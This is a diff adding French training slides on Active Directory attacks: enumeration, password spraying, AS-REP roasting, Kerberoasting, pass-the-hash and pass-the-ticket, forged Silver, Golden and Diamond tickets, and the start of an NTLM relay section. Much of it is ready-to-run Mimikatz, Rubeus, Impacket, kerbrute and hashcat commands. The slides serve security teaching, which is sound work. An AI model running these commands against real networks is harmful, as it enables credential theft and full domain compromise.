+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#001a00 0%,#004000 100%)" class="ctr">
+  <p class="part-number">Partie 1</p>
+  <h1 style="color:#fff;font-size:1.8em;">Reconnaissance</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Énumération &amp; Cartographie de l'environnement</p>
+</section>
+
+<section>
+  <h2>Pourquoi la reconnaissance est-elle primordiale ?</h2>
+  <ul>
+    <li>La phase de reconnaissance est souvent celle qui détermine le succès ou l'échec d'une attaque. Un attaquant qui comprend parfaitement son environnement cible choisit <strong>le chemin de moindre résistance</strong> — celui qui fait le moins de bruit et qui atteint le plus rapidement l'objectif.</li>
+    <li>Active Directory est conçu pour être <em>interrogeable par tout utilisateur authentifié</em> : LDAP est accessible en lecture à n'importe quel compte du domaine par défaut. Un attaquant avec un seul compte bas-privilège peut cartographier l'intégralité de l'annuaire sans déclencher la moindre alarme.</li>
+    <li>Cette accessibilité totale en lecture est une décision de conception de Microsoft — AD doit être utilisable, et les applications ont besoin de résoudre des noms, des groupes, des attributs. La conséquence est qu'<strong>aucune information dans l'annuaire ne peut être considérée comme secrète</strong> du point de vue d'un attaquant authentifié.</li>
+    <li>Les outils modernes comme BloodHound automatisent entièrement cette phase : en quelques minutes, une cartographie complète du domaine est disponible, avec les chemins d'attaque calculés automatiquement.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>LDAP — La mine d'information accessible à tous</h2>
+  <ul>
+    <li>Le protocole LDAP (port 389 / 636 en TLS) est le protocole d'interrogation d'AD. Toute requête LDAP avec un filtre approprié retourne les objets correspondants et leurs attributs — y compris des attributs très sensibles comme <code>servicePrincipalName</code>, <code>userAccountControl</code>, <code>description</code>, <code>memberOf</code>.</li>
+    <li>Une requête LDAP typique pour trouver tous les utilisateurs du domaine : <code>(&(objectCategory=person)(objectClass=user))</code>. Ajouter <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> filtre sur le flag <code>DONT_REQ_PREAUTH</code>.</li>
+    <li>Les attributs retournés par défaut incluent déjà tout ce dont un attaquant a besoin pour cibler ses premières attaques. Des outils comme <strong>ldapdomaindump</strong> aspirent l'intégralité de l'annuaire en une commande.</li>
+  </ul>
+  <div class="warnbox">
+    Un audit de sécurité commence toujours par une phase d'énumération LDAP — si votre DC ne répond pas à des requêtes LDAP filtrées, c'est un problème de configuration, pas une protection
+  </div>
+</section>
+
+<section>
+  <h2>Ce qu'on cherche — Comptes vulnérables</h2>
+  <ul>
+    <li><strong>Comptes avec <code>DONT_REQ_PREAUTH</code></strong> : ces comptes peuvent être attaqués sans aucun credential préalable via AS-REP Roasting — ce sont des cibles prioritaires pour obtenir un premier accès.</li>
+    <li><strong>Comptes avec SPN</strong> (Service Principal Names) : tout compte <em>utilisateur</em> (non-machine) avec un SPN est attaquable par Kerberoasting — on peut obtenir un hash crackable offline avec n'importe quel compte authentifié du domaine.</li>
+    <li><strong>Comptes avec <code>adminCount=1</code></strong> : ces comptes sont ou ont été membres de groupes privilégiés à un moment. Leur DACL est contrôlée par AdminSDHolder et ils constituent des cibles de haute valeur.</li>
+    <li><strong>Comptes avec mot de passe n'ayant jamais expiré</strong> ou <strong>comptes inactifs</strong> : les comptes de service sont souvent configurés avec des mot de passe permanents qui n'ont pas changé depuis des années — ce qui les rend vulnérables au Kerberoasting avec des wordlists ciblées.</li>
+    <li><strong>Champ <code>description</code> non vide</strong> : il est remarquablement fréquent en entreprise de trouver des mots de passe ou des informations sensibles dans la description d'un compte — erreur d'administration classique.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Ce qu'on cherche — Infrastructure et permissions</h2>
+  <ul>
+    <li><strong>Machines avec Unconstrained Delegation</strong> (flag <code>TRUSTED_FOR_DELEGATION</code>, hors DCs) : ces machines stockent les TGTs des utilisateurs qui s'y connectent — les compromettre permet de voler des tickets de haute valeur.</li>
+    <li><strong>Relations d'approbation (trusts)</strong> : une confiance entre domaines peut permettre à un attaquant ayant compromis un domaine de se propager dans un domaine adjacent, surtout si la confiance est bidirectionnelle.</li>
+    <li><strong>ACE intéressantes sur des objets sensibles</strong> : GenericAll sur un compte DA, WriteDACL sur le domaine, AddMember sur Domain Admins... Ces permissions accordées par erreur constituent souvent le chemin d'attaque le plus direct.</li>
+    <li><strong>Membres des groupes privilégiés</strong> : connaître exactement qui est Domain Admin, Backup Operator, etc. permet de cibler les comptes qui donnent accès aux ressources les plus sensibles avec le moins d'étapes possibles.</li>
+    <li><strong>Sessions actives</strong> (HasSession) : savoir qu'un admin est actuellement connecté sur une machine permet de cibler cette machine pour in-fine voler son TGT et Pass-the-Ticket.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>SPN — Service Principal Names en détail</h2>
+  <ul>
+    <li>Un SPN est un identifiant unique d'une instance de service dans AD. Il associe un service à son compte de domaine — c'est ce qui permet à Kerberos de savoir quel hash utiliser pour chiffrer le Service Ticket correspondant.</li>
+    <li>Format général : <code>serviceClass/hostname[:port[/instanceName]]</code>. Exemples courants :</li>
+  </ul>
+  <pre><code class="language-text">MSSQLSvc/srv-sql01.corp.local:1433   → SQL Server
+HTTP/intranet.corp.local             → IIS / Application web
+CIFS/fileserver.corp.local           → Partage de fichiers
+LDAP/DC01.corp.local                 → LDAP sur DC (toujours présent)</code></pre>
+  <ul>
+    <li>Chaque SPN est enregistré sur un objet AD (compte user ou machine). Si le SPN est sur un <strong>compte utilisateur</strong>, le ST correspondant sera chiffré avec le NT hash de ce compte — exploitable par Kerberoasting.</li>
+    <li>Les comptes machine ont des SPNs aussi, mais leurs mot de passe font 120 caractères aléatoires et se renouvellent tous les 30 jours — pratiquement impossible à cracker, donc pas intéressants pour Kerberoasting.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Groupes privilégiés — Cartographie des cibles</h2>
+  <table>
+    <thead><tr><th style="width:35%;">Groupe</th><th style="width:65%;">Pourquoi c'est une cible pour un attaquant</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Domain Admins</strong></td><td>Droits d'administration complets sur tout le domaine — objectif principal</td></tr>
+      <tr><td><strong>Enterprise Admins</strong></td><td>Droits sur toute la forêt AD, y compris la configuration de la forêt</td></tr>
+      <tr><td><strong>Account Operators</strong></td><td>Peut créer des comptes et les ajouter à la plupart des groupes</td></tr>
+      <tr><td><strong>Backup Operators</strong></td><td>Peut sauvegarder/restaurer des fichiers, y compris NTDS.dit — chemin vers tous les hashes</td></tr>
+      <tr><td><strong>Server Operators</strong></td><td>Peut démarrer/arrêter des services et se connecter localement aux DCs</td></tr>
+      <tr><td><strong>Print Operators</strong></td><td>Peut charger des drivers sur les DCs — vecteur d'exécution de code</td></tr>
+      <tr><td><strong>DNSAdmins</strong></td><td>Peut faire charger une DLL arbitraire par le service DNS sur le DC</td></tr>
+      <tr><td><strong>Remote Management Users</strong></td><td>Accès WinRM (PowerShell distant) aux machines concernées</td></tr>
+    </tbody>
+  </table>
+</section>
+
+
+
+<!-- =====================================================================
+     PARTIE 2 — CREDENTIALS
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#200015 0%,#4a0035 100%)" class="ctr">
+  <p class="part-number">Partie 2</p>
+  <h1 style="color:#fff;font-size:1.8em;">Attaques sur les Credentials</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Password Spraying · AS-REP Roasting · Kerberoasting</p>
+</section>
+
+<section>
+  <h2>Vue d'ensemble — Obtenir un premier accès</h2>
+  <ul>
+    <li>Cette partie couvre les attaques qui permettent d'obtenir un <strong>premier credential valide</strong> sur le domaine, ou d'élever les privilèges à partir d'un compte bas-privilège en récupérant le mot de passe d'un compte plus intéressant.</li>
+    <li>Ces attaques ont en commun d'exploiter des <em>faiblesses de configuration</em> dans AD ou des <em>mots de passe faibles</em> — elles ne nécessitent pas de vulnérabilité logicielle et fonctionnent sur tout AD, même entièrement patché.</li>
+    <li>Elles sont particulièrement puissantes car elles <strong>ne génèrent aucune alerte par défaut</strong> sur un AD standard — AS-REP Roasting et Kerberoasting ressemblent à des requêtes d'authentification légitimes.</li>
+  </ul>
+  <table style="margin-top:0.5em;">
+    <thead><tr><th>Attaque</th><th>Credential requis</th><th>Résultat</th></tr></thead>
+    <tbody>
+      <tr><td>Password Spraying</td><td>Aucun (liste de comptes)</td><td>Accès direct si mot de passe faible</td></tr>
+      <tr><td>AS-REP Roasting</td><td>Aucun (null session) ou user</td><td>Hash à cracker offline</td></tr>
+      <tr><td>Kerberoasting</td><td>N'importe quel compte du domaine</td><td>Hash à cracker offline</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section>
+  <h2>Password Spraying — Principe et timing</h2>
+  <ul>
+    <li>Le Password Spraying consiste à tester <strong>un mot de passe unique</strong> contre un grand nombre de comptes, contrairement au brute force classique qui teste de nombreux mots de passe sur un seul compte. Cette inversion permet d'éviter le verrouillage de compte.</li>
+    <li>La plupart des politiques AD verrouillent un compte après 3 à 10 tentatives échouées dans une fenêtre de temps (souvent 30 minutes). En ne testant qu'un seul mot de passe par fenêtre temporelle, on reste en dessous du seuil indéfiniment.</li>
+    <li>L'efficacité est surprenante : dans un domaine de 500 utilisateurs, si seulement <strong>1% ont un mot de passe faible</strong> (ce qui est statistiquement quasi-certain), cela représente 5 comptes compromis avec une seule vague de spray.</li>
+    <li>Il faut au préalable connaître la politique de verrouillage du domaine — requête LDAP sur l'attribut <code>lockoutThreshold</code> de l'objet domaine. L'outil <strong>kerbrute</strong> (via Kerberos, donc sans logs LDAP) est particulièrement discret.</li>
+  </ul>
+  <div class="hlbox">
+    Le Password Spraying est souvent la toute première attaque tentée après énumération des comptes — elle ne laisse quasiment aucune trace si bien exécutée
+  </div>
+</section>
+
+<section>
+  <h2>Password Spraying — Construction des wordlists</h2>
+  <ul>
+    <li><strong>Mots de passe saisonniers</strong> : <code>Printemps2024!</code>, <code>Automne2024</code>, <code>Noel2024!</code> — ce pattern est extrêmement répandu car les utilisateurs doivent régulièrement changer leur mot de passe et choisissent souvent la saison + l'année courante.</li>
+    <li><strong>Mots de passe dérivés du nom de l'organisation</strong> : <code>NomEntreprise2024</code>, <code>NomEntreprise!</code>, <code>NomEntreprise123</code> — souvent utilisés comme mot de passe initial ou par les utilisateurs qui veulent "s'en souvenir facilement".</li>
+    <li><strong>Mots de passe universellement faibles</strong> : <code>Welcome1</code>, <code>P@ssword1</code>, <code>Password123!</code>, <code>Azerty1!</code> — ces mot de passe satisfont les critères de complexité Windows (majuscule, minuscule, chiffre, caractère spécial) tout en étant triviaux à deviner.</li>
+    <li><strong>Mots de passe de bienvenue standards</strong> : de nombreux services informatiques utilisent un mot de passe standard pour les nouveaux comptes et espèrent que l'utilisateur le changera — ce qu'il ne fait souvent pas.</li>
+  </ul>
+  <pre><code class="language-bash">kerbrute passwordspray -d corp.local users.txt "Automne2024!"
+CrackMapExec smb dc01.corp.local -u users.txt -p "Automne2024!" --no-bruteforce</code></pre>
+</section>
+
+<section>
+  <h2>AS-REP Roasting — La pré-authentification Kerberos</h2>
+  <ul>
+    <li>Par défaut, lorsqu'un client demande un TGT (AS-REQ), il doit inclure un <strong>authentifiant de pré-authentification</strong> : un timestamp chiffré avec son NT hash. Le KDC déchiffre cet authentifiant pour vérifier que le client connaît bien son mot de passe avant de lui répondre.</li>
+    <li>Ce mécanisme est crucial : sans pré-authentification, le KDC répondrait à n'importe qui demandant un TGT pour n'importe quel compte — et la réponse AS-REP contiendrait une partie chiffrée avec le hash de ce compte, permettant une attaque offline.</li>
+    <li>L'attribut <code>DONT_REQ_PREAUTH</code> du flag <code>userAccountControl</code> désactive cette protection pour un compte spécifique. Certains vieux clients Kerberos (ou certaines applications mal configurées) ne supportent pas la pré-auth, ce qui conduit les admins à désactiver cette protection.</li>
+    <li>Cette configuration est une <strong>mauvaise pratique grave</strong> qui expose directement le hash du compte à une attaque offline, sans qu'un attaquant n'ait besoin du moindre credential préalable.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>AS-REP Roasting — Mécanisme d'attaque</h2>
+  <div class="mbox">
+    <p class="mg">// alice a DONT_REQ_PREAUTH activé dans son userAccountControl</p>
+    <p class="mc"><span class="my">1.</span> Attaquant ──→ KDC : AS-REQ pour alice <span class="mg">(aucune pré-auth fournie)</span></p>
+    <p class="mc"><span class="my">2.</span> KDC ────────→ Attaquant : AS-REP</p>
+    <p style="margin-left:2em;" class="mc">├─ TGT chiffré avec hash krbtgt <span class="mg">[opaque, inutile]</span></p>
+    <p style="margin-left:2em;" class="mc">└─ Clé de session <span class="mr">[chiffrée avec NT hash d'alice]</span> ← <strong>ON CRAQUE ÇA</strong></p>
+    <p class="mc"><span class="my">3.</span> Attaquant → hashcat -m 18200 → mot de passe d'alice en clair</p>
+  </div>
+  <ul>
+    <li>L'attaque peut être menée <strong>sans aucun credential</strong> si null session LDAP est possible (possible dans de rares configs) ou avec n'importe quel compte du domaine pour l'énumération.</li>
+    <li>Le hash retourné est au format <code>$krb5asrep$23$</code> — crackable avec hashcat mode 18200 et une bonne wordlist (rockyou, règles custom).</li>
+    <li>BloodHound identifie directement les comptes concernés via la propriété <code>dontreqpreauth: true</code> sur les nœuds User.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>AS-REP Roasting — Outils et commandes</h2>
+  <pre><code class="language-bash"># Impacket — depuis Linux, sans credential
+GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
+
+# Impacket — avec un compte du domaine pour énumérer automatiquement
+GetNPUsers.py corp.local/alice:password -request -format hashcat -outputfile asrep.txt
+
+# Rubeus — depuis Windows
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Crack offline avec hashcat
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+  <ul style="margin-top:0.4em;">
+    <li>Si le mot de passe cracké donne accès à un compte de service ou à un compte avec des ACE intéressantes, c'est souvent le point d'entrée qui ouvre toute la chaîne d'escalade.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Kerberoasting — Pourquoi les comptes de service sont vulnérables</h2>
+  <ul>
+    <li>Tout utilisateur authentifié du domaine peut demander au KDC un Service Ticket (ST) pour n'importe quel SPN enregistré dans AD. C'est une fonctionnalité normale de Kerberos — un client demande un ticket pour se connecter à un service.</li>
+    <li>Le Service Ticket est <strong>chiffré avec le NT hash du compte propriétaire du SPN</strong>. Si ce compte est un compte utilisateur (pas machine), ce NT hash est dérivé d'un mot de passe défini par un humain — et donc potentiellement faible et crackable.</li>
+    <li>Les comptes de service AD créés manuellement (pour des applications, des services Windows, des tâches planifiées) ont souvent des mots de passe : définis au départ sans politique stricte, jamais changés depuis des années, parfois documentés dans des fichiers de configuration, et souvent partagés entre plusieurs comptes.</li>
+    <li>Cette attaque est fondamentalement différente de l'AS-REP Roasting car elle <strong>ne nécessite aucune mauvaise configuration</strong> — elle exploite le fonctionnement normal de Kerberos. Tout compte de service avec un SPN user est vulnérable par design.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Kerberoasting — Mécanisme d'attaque</h2>
+  <div class="mbox">
+    <p class="mg">// svc-sql a le SPN : MSSQLSvc/srv-sql01.corp.local:1433</p>
+    <p class="mc"><span class="my">1.</span> Attaquant ──→ KDC : TGS-REQ avec TGT valide + SPN de svc-sql</p>
+    <p class="mc"><span class="my">2.</span> KDC ────────→ Attaquant : TGS-REP</p>
+    <p style="margin-left:2em;" class="mc">└─ ST <span class="mr">[chiffré avec NT hash de svc-sql]</span> ← <strong>ON CRAQUE ÇA</strong></p>
+    <p class="mc"><span class="my">3.</span> Attaquant → hashcat -m 13100 (RC4) ou -m 19700 (AES256)</p>
+    <p class="mc"><span class="my">4.</span> Mot de passe de svc-sql récupéré → <span class="mr">authentification directe</span></p>
+  </div>
+  <ul>
+    <li>L'attaquant demande des STs pour tous les comptes avec SPN en une seule passe — aucune interaction avec les services cibles n'est nécessaire.</li>
+    <li>Le KDC génère les tickets sans suspicion car <strong>la demande est parfaitement légitime</strong> — n'importe quel client est censé pouvoir demander un ST pour n'importe quel service.</li>
+    <li>Les STs récupérés sont crackés offline, sans aucune interaction supplémentaire avec le réseau — technique totalement passive après la collecte.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Kerberoasting — RC4 vs AES et ciblage</h2>
+  <ul>
+    <li><strong>RC4-HMAC</strong> (type 23) : le chiffrement basé directement sur le NT hash. C'est le type historique, encore très répandu. Crackage avec hashcat mode 13100 — vitesse de plusieurs milliards de tentatives/seconde sur GPU moderne.</li>
+    <li><strong>AES256-CTS-HMAC-SHA1</strong> (type 18) : dérive une clé depuis le mot de passe via PBKDF2. Environ 10× plus lent à cracker que RC4. Mais <strong>un attaquant peut forcer la demande en RC4</strong> en spécifiant <code>etype=23</code> dans la TGS-REQ, même si le compte supporte AES.</li>
+    <li><strong>Kerberoasting ciblé</strong> : via une ACE <code>GenericWrite</code> (ou sa variante minimale <code>WriteSPN</code>) sur un compte utilisateur, on peut ajouter un SPN à n'importe quel compte (même un DA) pour le rendre instantanément Kerberoastable. BloodHound CE matérialise la permission minimale comme arête <code>WriteSPN</code> — contrairement à <code>GenericWrite</code>, elle ne donne accès qu'à <code>servicePrincipalName</code>, pas à <code>msDS-KeyCredentialLink</code>.</li>
+  </ul>
+  <pre><code class="language-bash"># Impacket — tous les comptes avec SPN
+GetUserSPNs.py corp.local/alice:password -request -outputfile kerb.txt
+
+# Hashcat — RC4
+hashcat -m 13100 kerb.txt wordlist.txt -r rules/best64.rule
+
+# Rubeus — forcer RC4
+Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt</code></pre>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE 3 — TICKETS KERBEROS
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#000020 0%,#00004a 100%)" class="ctr">
+  <p class="part-number">Partie 3</p>
+  <h1 style="color:#fff;font-size:1.8em;">Attaques sur les Tickets</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Overpass-the-Hash · PtT · Silver · Golden · Diamond</p>
+</section>
+
+
+<section>
+  <h2>Où se trouvent les hashes — LSASS, NTDS.dit, SAM</h2>
+  <div class="two-col" style="font-size:0.9em;">
+    <div>
+      <h3>LSASS (en mémoire)</h3>
+      <ul>
+        <li>Hashes des sessions actives (users connectés)</li>
+        <li>Tickets Kerberos (TGT + STs)</li>
+        <li>Credentials en clair (WDigest activé sur anciens systèmes)</li>
+        <li>Accès : droits SYSTEM ou SeDebugPrivilege</li>
+        <li>Outil : Mimikatz <code>sekurlsa::logonpasswords</code></li>
+      </ul>
+    </div>
+    <div>
+      <h3>NTDS.dit (DC)</h3>
+      <ul>
+        <li>NT hashes de tous les comptes du domaine</li>
+        <li>Données d'authentification Kerberos</li>
+        <li>Chiffré avec SYSTEM hive (SYSKEY)</li>
+        <li>Accès : DA ou droits de réplication (DCSync, cf Partie 5)</li>
+        <li>Outil : Mimikatz <code>lsadump::dcsync</code>, secretsdump.py</li>
+      </ul>
+    </div>
+  </div>
+  <div class="infobox" style="margin-top:0.5em;">
+    La SAM locale (<code>C:\Windows\System32\config\SAM</code>) contient les hashes des comptes locaux de la machine — utile pour la persistance locale et le mouvement latéral via admin local
+  </div>
+</section>
+
+<section>
+  <h2>Pass-the-Hash (PtH)</h2>
+  <ul>
+    <li>Le Pass-the-Hash exploite le fait que NTLM utilise directement le NT hash dans le protocole challenge-response. Au lieu de dériver le NT hash depuis un mot de passe, on l'injecte directement dans les structures d'authentification Windows.</li>
+    <li>Une fois un NT hash extrait (depuis LSASS ou NTDS.dit), on peut ouvrir des connexions SMB, WinRM, RPC ou HTTP authentifiées en tant que le compte propriétaire du hash — <strong>sans jamais saisir le mot de passe</strong>.</li>
+    <li>Cette technique fonctionne jusqu'à ce que le hash extrait soit invalide (rotation de mot de passe). Elle fonctionne aussi pour le compte Administrator local si le RID est 500 (pas les admins locaux non-RID500 depuis KB2871997).</li>
+  </ul>
+  <pre><code class="language-bash"># Mimikatz — ouvrir un shell en tant que alice avec son hash
+sekurlsa::pth /user:alice /domain:corp.local /ntlm:aabbcc... /run:cmd.exe
+
+# Impacket — connexion SMB avec hash
+psexec.py corp.local/alice@192.168.1.10 -hashes :aabbcc...
+wmiexec.py corp.local/alice@192.168.1.10 -hashes :aabbcc...
+
+# CrackMapExec — spray sur tout un subnet
+cme smb 192.168.1.0/24 -u alice -H aabbcc... --local-auth</code></pre>
+</section>
+
+<section>
+  <h2>Overpass-the-Hash</h2>
+  <ul>
+    <li>L'Overpass-the-Hash consiste à utiliser un NT hash pour initier une authentification Kerberos. Le NT hash est utilisé comme clé pour chiffrer l'authentifiant de pré-authentification (timestamp) — exactement comme le ferait le client Kerberos légitime.</li>
+    <li>Le résultat est un <strong>TGT Kerberos valide</strong> pour le compte, obtenu sans connaître le mot de passe en clair. Ce TGT peut ensuite être utilisé pour demander des Service Tickets pour n'importe quel service du domaine.</li>
+    <li>Particulièrement utile dans les environnements où NTLM est restreint ou monitoré mais où Kerberos reste disponible. Permet aussi de convertir un hash récupéré offline en session Kerberos active.</li>
+  </ul>
+  <pre><code class="language-bash"># Mimikatz — obtenir un processus avec TGT Kerberos injecté
+sekurlsa::pth /user:alice /domain:corp.local /ntlm:aabbcc... /run:powershell.exe
+
+# Rubeus — demander le TGT et l'injecter directement
+Rubeus.exe asktgt /user:alice /rc4:aabbcc... /ptt
+
+# Rubeus — demander le TGT et l'écrire dans un fichier
+Rubeus.exe asktgt /user:alice /rc4:aabbcc... /outfile:alice.kirbi</code></pre>
+</section>
+
+<section>
+  <h2>Pass-the-Ticket (PtT)</h2>
+  <ul>
+    <li>Les tickets Kerberos (TGT et STs) sont stockés en mémoire LSASS. Ils peuvent être exportés en fichiers <code>.kirbi</code> et importés sur une autre machine — sans connaître le hash ni le mot de passe. Le ticket reste valide jusqu'à son expiration (10h par défaut pour un TGT).</li>
+    <li>Scénario typique : un admin est connecté sur la machine compromise → son TGT est en mémoire → export → import sur la machine attaquante → session Kerberos complète avec ses droits, sans bruit.</li>
+  </ul>
+  <pre><code class="language-bash"># Mimikatz — exporter tous les tickets
+sekurlsa::tickets /export
+
+# Rubeus — lister et exporter
+Rubeus.exe dump /service:krbtgt /nowrap
+
+# Importer un ticket (inject dans la session courante)
+Rubeus.exe ptt /ticket:alice.kirbi
+kerberos::ptt alice.kirbi  # Mimikatz</code></pre>
+</section>
+
+<section>
+  <h2>Silver Ticket — Forger un Service Ticket</h2>
+  <ul>
+    <li>Le Silver Ticket consiste à <strong>forger complètement un Service Ticket</strong> en utilisant le NT hash du compte de service. On ne demande rien au KDC — on crée le ticket de toutes pièces localement, en y inscrivant le PAC de notre choix (nom, SID, groupes).</li>
+    <li>Rappel : le Service Ticket est validé par le service lui-même avec son propre hash (étapes 5/6 de Kerberos) — le DC n'intervient pas dans cette validation. Un ticket correctement forgé sera donc accepté sans que le DC ne soit jamais contacté, sans trace dans les logs du DC.</li>
+    <li>On choisit dans le PAC forgé un utilisateur Administrator avec les SID des groupes Domain Admins — le service croira qu'il communique avec un administrateur de domaine, alors que le compte n'existe peut-être même pas.</li>
+  </ul>
+  <pre><code class="language-bash"># Mimikatz — forger un Silver Ticket pour CIFS/srv-fileserver
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
+  /target:srv-fileserver.corp.local /service:cifs \
+  /rc4:aabbcc... /ptt   # rc4 = NT hash du compte machine srv-fileserver$</code></pre>
+  <div class="hlbox" style="margin-top:0.3em;">
+    Aucune trace sur le DC — le ticket ne transite jamais par le KDC après sa création
+  </div>
+</section>
+
+<section>
+  <h2>Golden Ticket — Forger un TGT</h2>
+  <ul>
+    <li>Forger un <strong>TGT complet</strong> avec le NT hash de krbtgt — le ticket est accepté par tout KDC. On inscrit dans le PAC les SID voulus (Domain Admins, Enterprise Admins...), pour un compte qui peut ne pas exister.</li>
+    <li>Persistance remarquable : le ticket reste valide même si le mot de passe d'Administrator est changé ou si le compte "forgé" est supprimé. Il n'est invalidé que par une <strong>double rotation du mot de passe krbtgt</strong>.</li>
+    <li>La double rotation de krbtgt est l'action prioritaire post-compromission DC — mais elle doit être planifiée avec soin (risque de casser des sessions en cours).</li>
+  </ul>
+  <pre><code class="language-bash"># Mimikatz — créer un Golden Ticket
+kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... \
+  /krbtgt:aabbcc... /groups:512,519,544 /ptt</code></pre>
+</section>
+
+<section>
+  <h2>Diamond Ticket — La variante discrète</h2>
+  <ul>
+    <li>Le Diamond Ticket est une variante moderne du Golden Ticket qui cherche à être <strong>moins détectable</strong>. Au lieu de forger un TGT de zéro, on demande un vrai TGT au KDC pour un compte légitime, puis on déchiffre le PAC avec le hash krbtgt, on le modifie (en ajoutant des SID de groupes privilégiés), et on rechiffre.</li>
+    <li>L'avantage est que le TGT a un horodatage et une structure parfaitement légitimes — les solutions de détection basées sur l'analyse des tickets (anomalies de timestamp, RID inexistants...) seront moins susceptibles de le détecter qu'un Golden Ticket classique.</li>
+    <li>Cette technique est plus récente et requiert les mêmes prérequis que le Golden Ticket (hash krbtgt), mais peut passer à travers certaines détections qui bloquent les Golden Tickets. C'est une illustration de la course permanente entre techniques d'attaque et de détection.</li>
+  </ul>
+  <pre><code class="language-bash"># Rubeus — Diamond Ticket
+Rubeus.exe diamond /krbkey:&lt;aes256_krbtgt&gt; /user:alice /password:alice_password \
+  /enctype:aes /ticketuser:Administrator /ticketuserdomainsid:S-1-5-21-... \
+  /groups:512 /ptt</code></pre>
+</section>
+
+<section>
+  <h2>Comparaison — Attaques sur les tickets</h2>
+  <table>
+    <thead><tr><th style="width:20%;"></th><th>Silver</th><th>Golden</th><th>Diamond</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Hash requis</strong></td><td>Compte de service</td><td>krbtgt</td><td>krbtgt (AES)</td></tr>
+      <tr><td><strong>Ticket forgé</strong></td><td>Service Ticket</td><td>TGT (de zéro)</td><td>TGT (modifié)</td></tr>
+      <tr><td><strong>Accès</strong></td><td>1 service ciblé</td><td>Tout le domaine</td><td>Tout le domaine</td></tr>
+      <tr><td><strong>Trace KDC</strong></td><td>Aucune</td><td>TGS-REQ lors de l'usage</td><td>AS-REQ légitime</td></tr>
+      <tr><td><strong>Détection</strong></td><td>Très difficile</td><td>Possible (anomalies PAC)</td><td>Difficile</td></tr>
+      <tr><td><strong>Persistance</strong></td><td>Rotation hash service</td><td>Double rotation krbtgt</td><td>Double rotation krbtgt</td></tr>
+    </tbody>
+  </table>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE 4 — NTLM RELAY
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#1a0a00 0%,#3d2000 100%)" class="ctr">
+  <p class="part-number">Partie 4</p>
+  <h1 style="color:#fff;font-size:1.8em;">NTLM &amp; Attaques par Relai</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Poisoning · SMB Relay · LDAP Relay · Coercition</p>
+</section>
+
+<section>
+  <h2>Pourquoi NTLM reste un vecteur d'attaque majeur</h2>
+  <ul>
+    <li>Malgré Kerberos comme protocole par défaut, NTLM est utilisé automatiquement dans de nombreux cas : accès à une ressource par adresse IP plutôt que par nom DNS, service sans SPN enregistré, fallback en cas d'échec Kerberos, clients hors domaine, et beaucoup d'applications legacy qui forcent explicitement NTLM.</li>
+    <li>Désactiver NTLM complètement est un objectif louable mais extrêmement difficile en pratique : il casse régulièrement des applications, des scripts d'administration, des anciennes imprimantes réseau, et des services tiers qui n'ont pas été mis à jour.</li>
+    <li>NTLM est donc présent dans la quasi-totalité des réseaux Windows, et il présente une vulnérabilité fondamentale : <strong>les challenges NTLM peuvent être relayés</strong>. Contrairement à Kerberos, NTLM n'intègre pas de protection contre le relai (pas de liaison au canal de transport).</li>
+    <li>Les attaques NTLM Relay sont d'autant plus puissantes qu'elles peuvent être <strong>entièrement automatisées</strong> et combinées avec d'autres techniques (coercition d'authentification, LDAP relay pour RBCD) pour construire des chaînes d'attaque complexes.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>LLMNR / NBT-NS / mDNS — Protocoles de résolution de noms</h2>
+  <ul>
+    <li><strong>LLMNR</strong> (Link-Local Multicast Name Resolution, RFC 4795) et <strong>NBT-NS</strong> (NetBIOS Name Service) sont des protocoles de résolution de noms en broadcast/multicast qui entrent en jeu quand la résolution DNS échoue. Ils sont activés par défaut sur tous les Windows.</li>
+    <li>Scénario typique : un utilisateur fait une faute de frappe en accédant à <code>\\FILSERVEUR</code> au lieu de <code>\\FILESERVER</code>. DNS ne connaît pas ce nom → Windows envoie une requête LLMNR en broadcast sur le LAN : <em>"Quelqu'un connaît FILSERVEUR ?"</em>.</li>
+    <li>N'importe quelle machine sur le LAN peut répondre <em>"Oui, c'est moi"</em> — Windows accepte la première réponse reçue sans vérification d'authenticité. La victime envoie alors automatiquement ses credentials NTLM à l'attaquant pour s'authentifier.</li>
+    <li><strong>mDNS</strong> (Multicast DNS, utilisé notamment par les Macs et Linux) est également sensible au même type de poisoning dans certains contextes.</li>
+  </ul>
+  <div class="hlbox">
+    Ces protocoles sont inutiles dans un AD bien configuré avec DNS fonctionnel — leur désactivation est une recommandation de durcissement standard (GPO)
+  </div>
+</section>
+
+<section>
+  <h2>Responder — Capturer les hashes Net-NTLMv2</h2>
+  <ul>
+    <li><strong>Responder</strong> est l'outil de référence pour l'exploitation de LLMNR/NBT-NS/mDNS. Il écoute sur toutes les interfaces réseau, répond à toutes les requêtes de résolution de noms, et présente de faux serveurs SMB, HTTP, FTP, SQL... pour capturer les authentifications.</li>
